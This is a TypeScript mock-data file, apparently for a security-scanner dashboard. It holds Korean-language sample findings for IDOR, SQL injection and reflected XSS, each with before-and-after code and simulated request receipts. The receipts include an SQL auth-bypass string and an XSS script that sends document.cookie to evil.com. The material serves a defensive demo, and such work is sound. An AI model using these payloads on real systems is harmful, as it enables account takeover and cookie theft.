import { Vulnerability, FilteredNoiseItem, ScanHistoryRecord } from '../types';

export const INITIAL_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'vuln-1',
    type: 'IDOR',
    endpoint: '/orders/1024',
    title: 'IDOR in Order Details',
    description: '주소의 id 값을 바꾸면 다른 사람 주문이 그대로 보입니다.',
    severity: 'high',
    status: 'unresolved',
    statusText: '미해결',
    selected: true,
    requiresIntentConfirmation: true,
    intentQuestion: {
      title: '확인이 필요해요',
      badgeText: '/orders/1024 · IDOR 의심',
      reasonText: "자동으로 확정 못 한 이유 — 이 데이터를 누가 봐도 되는지는 '당신 앱의 규칙'이라 저희가 모릅니다.",
      coreQuestion: '이 주문 내역은\n',
      highlightedPart: "'주문한 본인만'",
      yesOption: {
        label: '네, 본인만',
        outcome: '로그인 A로 만든 주문을 로그인 B로 열었더니 그대로 보였습니다. 진짜 문제 → 검증된 수정 PR 준비됨.',
      },
      noOption: {
        label: '아니요, 누구나 봐도 됨',
        outcome: '문제 아님. 목록에서 내립니다.',
      },
    },
    aiGuide: {
      title: 'IDOR 취약점 설명',
      explanation: '현재 시스템은 주문 정보를 조회할 때 사용자 권한을 확인하지 않고 단순히 URL의 id 파라미터만 사용하여 데이터베이스를 조회합니다. 이로 인해 인가되지 않은 사용자가 다른 사용자의 주문 내역을 열람할 수 있는 심각한 결함이 있습니다.',
      fixDirection: '데이터베이스 조회 쿼리에 현재 요청을 보낸 사용자(req.user.id)가 해당 주문의 소유자인지 확인하는 조건을 추가해야 합니다.',
      bestPracticeTip: '이러한 유형의 취약점을 방지하려면 리소스 접근 시 항상 소유권 검증 로직을 포함해야 합니다.',
    },
    codeSnippet: {
      fileName: 'orderController.js',
      problemLine: 2,
      fixLine: 5,
      beforeCode: `// 문제 라인
const order = await Order.findOne({ 
  id: req.params.id 
});`,
      afterCode: `// 수정 라인
const order = await Order.findOne({ 
  id: req.params.id, 
  userId: req.user.id 
});`,
      highlightBefore: 'id: req.params.id',
      highlightAfter: 'userId: req.user.id',
    },
    receipt: {
      timestamp: '2024-08-24 14:32:01 KST',
      endpoint: '/orders/1024',
      method: 'GET',
      payload: 'GET /orders/1024 HTTP/1.1\nHost: api.target-app.internal\nAuthorization: Bearer user_B_token_xyz',
      beforeResponse: {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Powered-By': 'Express',
        },
        body: JSON.stringify(
          {
            orderId: 1024,
            ownerId: 'user_A_99182',
            recipient: '홍길동 (User A)',
            shippingAddress: '서울특별시 강남구 테헤란로 152',
            totalAmount: 149000,
            items: [{ name: '보안 감사 패키지 PRO', qty: 1, price: 149000 }],
            creditCardLast4: '4192',
          },
          null,
          2
        ),
        vulnerable: true,
      },
      afterResponse: {
        status: 403,
        headers: {
          'Content-Type': 'application/json',
          'X-Protected-By': 'Unknown-Security-Patch',
        },
        body: JSON.stringify(
          {
            error: 'Forbidden',
            message: '해당 주문에 접근할 수 있는 권한이 없습니다. (Ownership Mismatch)',
            code: 'AUTH_FORBIDDEN_RESOURCE',
          },
          null,
          2
        ),
        vulnerable: false,
      },
      proofSummary: 'User B의 토큰으로 User A의 주문(orderId=1024) 조회 시도 → 패치 전에는 200 OK로 개인정보 유출, 패치 후에는 403 Forbidden 차단 검증 완료.',
    },
  },
  {
    id: 'vuln-2',
    type: 'SQLi',
    endpoint: '/login',
    title: 'SQL Injection in Login',
    description: '로그인 시 특수 문자를 넣어 보안을 뚫을 수 있습니다.',
    severity: 'high',
    status: 'unresolved',
    statusText: '미해결',
    selected: false,
    aiGuide: {
      title: 'SQL Injection 취약점 설명',
      explanation: '로그인 인증 처리 중 사용자 입력값(username, password)을 문자열 템플릿 리터럴로 직접 SQL 쿼리에 삽입하고 있습니다. 공격자가 \' OR 1=1 -- 과 같은 페이로드를 전달할 경우 비밀번호 검증 없이 관리자 권한을 획득할 수 있습니다.',
      fixDirection: '문자열 결합 쿼리 대신 매개변수화된 쿼리(Parameterized Query) 또는 ORM의 Prepared Statement 방식을 사용하여 입력을 데이터로만 취급해야 합니다.',
      bestPracticeTip: '동적 SQL 조립을 절대 지양하고, 입력값 화이트리스트 검증과 최소 권한 DB 계정을 사용하세요.',
    },
    codeSnippet: {
      fileName: 'authService.js',
      problemLine: 3,
      fixLine: 6,
      beforeCode: `// 문제 라인
const query = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;
const [user] = await db.raw(query);`,
      afterCode: `// 수정 라인
const user = await db('users')
  .where({ email })
  .first();
const isPasswordValid = await bcrypt.compare(password, user.passwordHash);`,
      highlightBefore: `email = '\${email}'`,
      highlightAfter: `.where({ email }) + bcrypt`,
    },
    receipt: {
      timestamp: '2024-08-24 14:32:05 KST',
      endpoint: '/login',
      method: 'POST',
      payload: `POST /login HTTP/1.1\nContent-Type: application/json\n\n{"email": "admin' OR 1=1 --", "password": "any"}`,
      beforeResponse: {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(
          {
            success: true,
            role: 'super_admin',
            token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_token_dump',
          },
          null,
          2
        ),
        vulnerable: true,
      },
      afterResponse: {
        status: 401,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(
          {
            success: false,
            error: 'Invalid credentials',
          },
          null,
          2
        ),
        vulnerable: false,
      },
      proofSummary: '악의적 SQL Injection 문자열 전달 시 이전에는 즉시 관리자 토큰 발급(200 OK), 수정 후 매개변수화 처리되어 401 Unauthorized 차단됨.',
    },
  },
  {
    id: 'vuln-3',
    type: 'XSS',
    endpoint: '/search',
    title: 'Reflected XSS in Search Query',
    description: '검색창에 스크립트를 넣어 다른 사용자의 정보를 훔칠 수 있습니다.',
    severity: 'medium',
    status: 'pending_intent',
    statusText: '판단 보류',
    selected: false,
    aiGuide: {
      title: 'Reflected XSS 취약점 설명',
      explanation: '검색 결과 페이지 렌더링 시 URL 쿼리스트링 `q`의 값이 HTML escape 처리 없이 그대로 dangerouslySetInnerHTML 또는 템플릿에 출력됩니다. 악성 스크립트가 삽입된 링크를 사용자가 클릭하면 세션 쿠키 탈취가 발생할 수 있습니다.',
      fixDirection: 'DOM 렌더링 시 innerHTML 대신 textContent를 사용하거나 DOMPurify 라이브러리를 통해 위험 태그 및 이벤트를 살균(Sanitize)해야 합니다.',
      bestPracticeTip: 'Contextual Encoding과 CSP(Content-Security-Policy) 헤더를 기본 적용하여 2차 방어벽을 구축하세요.',
    },
    codeSnippet: {
      fileName: 'searchRenderer.js',
      problemLine: 2,
      fixLine: 5,
      beforeCode: `// 문제 라인
resultContainer.innerHTML = \`<p>검색 결과: \${searchQuery}</p>\`;`,
      afterCode: `// 수정 라인
const sanitized = DOMPurify.sanitize(searchQuery);
resultContainer.textContent = \`검색 결과: \${sanitized}\`;`,
      highlightBefore: 'innerHTML =',
      highlightAfter: 'DOMPurify + textContent',
    },
    receipt: {
      timestamp: '2024-08-24 14:32:09 KST',
      endpoint: '/search?q=<script>fetch("http://evil.com/leak?c="+document.cookie)</script>',
      method: 'GET',
      payload: 'GET /search?q=%3Cscript%3Efetch(%22http%3A%2F%2Fevil.com... HTTP/1.1',
      beforeResponse: {
        status: 200,
        headers: { 'Content-Type': 'text/html' },
        body: '<div id="results"><p>검색 결과: <script>fetch("http://evil.com/leak?c="+document.cookie)</script></p></div>',
        vulnerable: true,
      },
      afterResponse: {
        status: 200,
        headers: { 'Content-Type': 'text/html', 'Content-Security-Policy': "default-src 'self'" },
        body: '<div id="results"><p>검색 결과: &lt;script&gt;fetch(&quot;http://evil.com/leak?c=&quot;+document.cookie)&lt;/script&gt;</p></div>',
        vulnerable: false,
      },
      proofSummary: '악성 자바스크립트 페이로드 인젝션 시 원본에서는 script 태그 실행 가능, 패치 후 안전하게 HTML 엔티티로 이스케이프 처리됨.',
    },
  },
];

export const SAMPLE_FILTERED_NOISE: FilteredNoiseItem[] = [
  {
    id: 'noise-1',
    type: 'Hardcoded Secret',
    endpoint: 'tests/fixtures/dummyAuth.test.ts',
    reason: '테스트 더미 데이터로 확인됨 (프로덕션 빌드 미포함 / 도달 불가)',
    category: 'unreachable',
  },
  {
    id: 'noise-2',
    type: 'Weak Hashing (MD5)',
    endpoint: 'utils/gravatarHelper.ts',
    reason: '비밀번호 해싱이 아닌 공공 Gravatar 이메일 캐시 키 생성 용도 (보안 위협 없음)',
    category: 'sanitized_upstream',
  },
  {
    id: 'noise-3',
    type: 'Prototype Pollution',
    endpoint: 'node_modules/legacy-deep-merge/index.js',
    reason: '실제 런타임에서 해당 모듈 함수를 호출하는 경로가 존재하지 않음 (Dead Code Path)',
    category: 'dead_code',
  },
  {
    id: 'noise-4',
    type: 'Open Redirect',
    endpoint: 'controllers/oauthCallback.ts',
    reason: '내부 도메인 화이트리스트 Regex 검증이 상단 미들웨어에서 선행 처리됨',
    category: 'sanitized_upstream',
  },
  {
    id: 'noise-5',
    type: 'Uncontrolled Resource Consumption',
    endpoint: 'lib/imageProcessor.ts',
    reason: 'NGINX 및 클라우드 게이트웨이에서 10MB 페이로드 제한이 사전 적용됨',
    category: 'false_positive',
  },
  {
    id: 'noise-6',
    type: 'Command Injection Suspect',
    endpoint: 'scripts/buildAnalytics.sh',
    reason: 'CI/CD 빌드 전용 로컬 스크립트로 외부 사용자 입력 주입 불가',
    category: 'unreachable',
  },
];

export const INITIAL_SCAN_HISTORY: ScanHistoryRecord[] = [
  {
    id: 'scan-104',
    repoUrl: 'https://github.com/my-org/express-commerce-api',
    date: '2024-08-24 14:30',
    totalFound: 3,
    resolved: 2,
    unresolved: 1,
    status: 'verified',
  },
  {
    id: 'scan-103',
    repoUrl: 'https://github.com/my-org/user-auth-service',
    date: '2024-08-20 11:15',
    totalFound: 1,
    resolved: 1,
    unresolved: 0,
    status: 'completed',
  },
  {
    id: 'scan-102',
    repoUrl: 'https://github.com/my-org/payment-gateway-relay',
    date: '2024-08-15 09:40',
    totalFound: 4,
    resolved: 4,
    unresolved: 0,
    status: 'verified',
  },
];
